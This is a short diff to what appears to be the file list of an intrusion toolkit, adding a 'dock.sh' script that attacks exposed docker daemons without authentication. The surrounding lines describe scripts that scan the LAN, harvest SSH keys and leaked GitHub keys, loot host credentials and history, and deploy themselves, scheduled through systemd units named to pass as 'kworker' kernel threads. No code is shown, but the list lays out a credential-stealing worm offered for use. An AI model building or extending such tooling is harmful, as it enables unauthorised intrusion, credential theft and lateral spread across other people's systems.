@@ -72,6 +72,7 @@ Numbered sections mirroring the phases, every command copy-pasteable, the three 
 - `spread.sh`       - LAN neighbour scan, re-use our key + a slice of the harvested keyring on :22, docker :2375
 - `hunt.sh`         - trust-graph loot first, then GitHub leaked-key harvest -> ssh probe -> deploy (curl/tar only)
 - `loot.sh`         - the host's own trust graph: ssh config, known_hosts, its own keys, history, LAN
+- `dock.sh`         - exposed docker daemons (:2375/:2376): no key, no user, no pairing, curl only
 - `kworker-spread.service/.timer`, `kworker-hunt.service/.timer`, `kworker-loot.service/.timer` - spread/loot schedules
 - `README.md`       - hosting, one-liner deploy, verification, threat model
 
